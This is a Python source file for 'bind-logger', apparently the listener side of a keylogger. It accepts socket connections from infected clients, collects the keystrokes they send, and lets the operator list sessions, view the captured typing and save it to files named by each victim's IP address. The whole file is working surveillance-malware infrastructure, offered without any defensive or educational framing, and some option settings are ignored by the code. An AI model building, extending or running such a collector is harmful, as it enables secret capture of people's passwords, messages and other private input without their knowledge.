import os
import sys
import socket
import threading
from datetime import datetime
from colorama import Fore, Style


class StoppableThread(threading.Thread):
    def __init__(self, *args, **kwargs):
        threading.Thread.__init__(self)
        super(StoppableThread, self).__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()


class ClientSession(StoppableThread):
    def __init__(self, session_manager, sid, client):
        self.controller = session_manager
        self.session_id = sid
        self.address = client.getpeername()
        self.session = client
        self.raw_keylogs = ""
        self.alive = True

    def start(self):
        while self.alive:
            try:
                data = self.session.recv(1024)
                if data:
                    self.raw_keylogs += data.decode()
            except socket.error as exc:
                interface.message(0, f"Session {self.session_id} ({self.address[0]}:{self.address[1]}) - Logs Saved", "DISCONNECT", True)
                if self.alive:
                    self.kill()
    
    def kill(self):
        self.alive = False
        self.session.close()
        session_manager.dead(self)


class SessionManager:
    def __init__(self):
        self.next_sid = 1
        self.sessions = []

    def get_session(self, sid) -> ClientSession:
        return next((s for s in self.sessions if s.session_id == sid), None)

    def add_session(self, client) -> ClientSession:
        client_session = ClientSession(self, self.next_sid, client)
        self.next_sid += 1
        self.sessions.append(client_session)
        return client_session

    def close_session(self, sid) -> None:
        session = self.get_session(sid)
        if session:
            session.kill()
        else:
            interface.message(0, f"Session {sid} does not exist.")

    def save_logs(self, sid) -> None:
        session = self.get_session(sid)
        if session:
            keylogs = self.__keylogs(session)
            self.__export_log(session, keylogs)
        else:
            interface.message(0, f"Session {sid} does not exist.")

    def print_logs(self, sid) -> None:
        session = self.get_session(sid)
        if session:
            print(self.__keylogs(session))
        else:
            interface.message(0, f"Session {sid} does not exist.")

    def __keylogs(self, session) -> None:
        title = f"\nKeyboard logs from - Session {session.session_id} ({session.address[0]}:{session.address[1]})"
        return f"{title}\n{'-' * len(title)}" + f"\n{session.raw_keylogs}"

    def __export_log(self, session, log_contents):
        if not os.path.exists(LOG_DIRECTORY):
            try:
                os.mkdir(LOG_DIRECTORY)
            except PermissionError:
                return False
        try:
            file_name = "Log-{}_{}.txt".format(session.address[0], datetime.now().strftime("%m-%d-%Y_%H-%M-%S"))
            with open("{}/{}".format(LOG_DIRECTORY, file_name), "w") as log:
                log.write(log_contents)
            # TODO add save confirmation message
        except PermissionError:
            return False

    def dead(self, session):
        self.sessions.remove(session)


class ListenerServer:
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.stopped = False

    def connection_gateway(self, listener_socket):
        interface.message(1, "Listening on {}:{}".format(*listener_socket.getsockname()), "LISTENER", True)
        while not self.stopped:
            (client, client_address) = listener_socket.accept()
            interface.message(1, "Connection from {}:{}".format(*client.getpeername()), "CONNECTION", True)

            new_session = session_manager.add_session(client)

            new_session_handler = StoppableThread(target=new_session.start)
            new_session_handler.daemon = True
            new_session_handler.start()

    def start(self) -> None:
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.bind((self.address, self.port))
        listener_socket.listen()

        connection_handler_thread = StoppableThread(target=self.connection_gateway, args=[listener_socket])
        connection_handler_thread.daemon = True
        connection_handler_thread.start()


class UserInterface:
    def __init__(self):
        self.options = {
            "LHOST": "0.0.0.0",
            "LPORT": 6666
        }
        self.help_options = {
            "sessions": "List all active sessions.",
            "logs <session_id>": "Display the logs of specified session.",
            "save <session_id>": "Save the logs of specified session to a file.",
            "help": "Display this list.",
            "options": "Display a list of variable options.",
            "set <variable> <value>": "Change the value of one of the available options.",
            "run": "Run the keylogger connection listener",
            "kill": "Stop a specified session/client connection.",
            "exit": "Shutdown listener server and close all sessions."
        }
        self.valid_commands = ("sessions", "logs", "save", "help", "exit", "options", "set", "run", "kill")
        self.listener_server = None

    def handle_command(self, command, args):
        if command == "sessions":
            print("\n".join([f" {c.session_id} | {c.address[0]}:{c.address[1]} | {len(c.raw_keylogs)}" for c in session_manager.sessions]) if len(session_manager.sessions) > 0 else "No active sessions.")
        
        elif command == "help":
            max_len = max(map(len, self.help_options))
            print("\n" + "\n".join([f" {' ' * (max_len - len(key)) + key} | {value}" for key, value in self.help_options.items()]) + "\n")

        elif command == "options":
            max_len = max(map(len, self.options))
            print("\n" + "\n".join([f" {' ' * (max_len - len(key)) + key} | {value}" for key, value in self.options.items()]) + "\n")

        elif command == "run":
            self.listener_server = ListenerServer("0.0.0.0", 6666)
            self.listener_server.start()

        elif command == "logs":
            if len(args) > 0:
                if args[0].isnumeric():
                    session_manager.print_logs(int(args[0]))
                else:
                    self.message(0, "Session ID must be a number.")

        elif command == "save":
            if len(args) > 0:
                if args[0].isnumeric():
                    session_manager.save_logs(int(args[0]))
                else:
                    self.message(0, "Session ID must be a number.")

        elif command == "set":
            if len(args) > 1:
                if args[0].upper() in self.options:
                    if args[0].upper() == "LPORT":
                        if args[1].isnumeric():
                            self.options[args[0].upper()] = int(args[1])
                        else:
                            self.message(0, "LPORT must be a number.")
                            return
                    else:
                        self.options[args[0].upper()] = args[1]
                    self.message(1, "Set {} to {}.".format(args[0].upper(), args[1]), "SUCCESS")
                else:
                    self.message(0, "Option {} does not exist.".format(args[0].upper()))

        elif command == "kill":
            if len(args) > 0:
                if args[0].isnumeric():
                    session_manager.close_session(int(args[0]))
                else:
                    self.message(0, "Session ID must be a number.")

        elif command == "exit":
            raise sys.exit("System Exit")

    def start(self):
        while True:
            print(f"{Fore.YELLOW}bind-logger{Fore.RED}:>{Fore.RESET}", end=" ")
            command_string = input().lower().split()
            if len(command_string) > 0 and command_string[0] in self.valid_commands:
                if len(command_string) > 1:
                    args = command_string[1:]
                else:
                    args = []
                self.handle_command(command_string[0], args)

    def message(self, status, text, symbol = "ERROR", line_break = False):
        lb = "\n"
        if status == 0:
            colour = Fore.RED
        else:
            colour = Fore.GREEN

        print(f"{line_break and lb or ''}[{colour}{symbol}{Fore.RESET}] > {text}")


if __name__ == "__main__":

    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)

    LOG_DIRECTORY = os.path.join(dname, "logs/")

    session_manager = SessionManager()
    
    interface = UserInterface()
    interface.start()
